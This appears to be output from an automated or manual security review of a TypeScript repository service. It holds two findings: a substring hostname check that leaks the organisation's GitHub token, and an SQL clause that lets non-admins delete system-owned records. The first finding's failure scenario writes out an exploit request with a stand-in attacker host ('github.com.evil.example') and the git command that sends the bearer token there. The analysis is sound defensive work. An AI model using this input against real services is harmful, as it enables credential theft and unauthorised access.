reason: gitAuthArgs in src/git-auth.ts:8 decides whether to attach the GitHub service token using `remoteUrl.includes("github.com")`, a plain substring test on the whole URL rather than a check of the parsed hostname. Any URL containing that substring anywhere (subdomain, path, or query) passes, e.g. `https://github.com.evil.example/x.git`. The header it returns (line 9) is the unscoped `http.extraHeader=Authorization: Bearer <token>`, which git sends to every host it contacts in that invocation. cloneRepo in src/worktree.ts:15 feeds the user-supplied `repo.remoteUrl` straight into gitAuthArgs together with SERVICE_TOKEN (the HARBOR_GITHUB_TOKEN env var, src/config.ts:4) and then runs `git clone <remoteUrl>`. The only caller, registerRepo in src/routes.ts:19-22, takes `remoteUrl` from `req.body`, checks only that it is non-empty, and has no admin gate (contrast auditLog at line 43). A repo-wide grep shows no URL parsing, hostname allow-list, or tests anywhere that would block this. All three findings describe this same defect from the callee and caller side.
failure_scenario: An authenticated user calls registerRepo (src/routes.ts:18) with body `{ id: "x", remoteUrl: "https://github.com.evil.example/x.git" }`. Line 20 passes (both fields non-empty). cloneRepo (src/worktree.ts:15) calls gitAuthArgs, whose `includes("github.com")` check at src/git-auth.ts:8 matches the attacker's subdomain, so git runs `git -c http.extraHeader=Authorization: Bearer <HARBOR_GITHUB_TOKEN> clone https://github.com.evil.example/x.git ...`. Git sends the Authorization header to the attacker's server, which logs the organisation's GitHub service token.
severity_reason: This is a directly exploitable credential exfiltration: any user who can hit the unprivileged registerRepo route obtains the org-wide GitHub service token (HARBOR_GITHUB_TOKEN) with a single request and no special access, giving them whatever that token can reach (typically private repositories and write access). The bypass requires no race or unusual state, and the repository has no validation or tests that would catch it.

reason: In src/store.ts, Store.deleteRepo (lines 24-31) takes the non-admin branch when ctx.isAdmin is false and runs `DELETE FROM repos WHERE id = ? AND (owner = ? OR owner = 'system')` at line 29. The `OR owner = 'system'` clause means the delete succeeds not only for rows the caller owns but for any row whose owner column is the literal 'system'. The only caller, the deleteRepo route in src/routes.ts:26-33, passes req.params.id and req.user straight into store.deleteRepo with no ownership or role check of its own and returns 204 on success. I searched the repository for any other guard: there is no middleware, no other reference to 'system' or isAdmin outside these two files, no schema, and no tests. The admin-IP check (isAdminAddress in src/config.ts) is applied only to the auditLog route, not to deleteRepo. The claim is confirmed at both listed locations; the root cause is store.ts:29 and routes.ts:28 simply propagates it.
failure_scenario: A repos row exists with id 'shared-tools' and owner 'system'. An ordinary authenticated user (req.user = { oid: 'u123', isAdmin: false }) sends DELETE for params.id = 'shared-tools'. routes.ts:28 calls store.deleteRepo('shared-tools', req.user); store.ts:29 executes the DELETE with the `OR owner = 'system'` clause, which matches the row, so changes is 1, no error is thrown, and the route returns 204. The shared system repository record is removed by a user who does not own it and is not an admin.
severity_reason: This is an authorization bypass in Store.deleteRepo (src/store.ts:29) that lets any authenticated non-admin destroy shared, system-owned repository records, which is destructive and reachable from a public route. I rate it High rather than Critical because nothing in the repository actually inserts a row with owner 'system' (registerRepo at routes.ts:21 always sets owner to the caller's oid), so the exploitable state depends on data seeded outside this codebase, and only the DB row is deleted, not the on-disk clone.
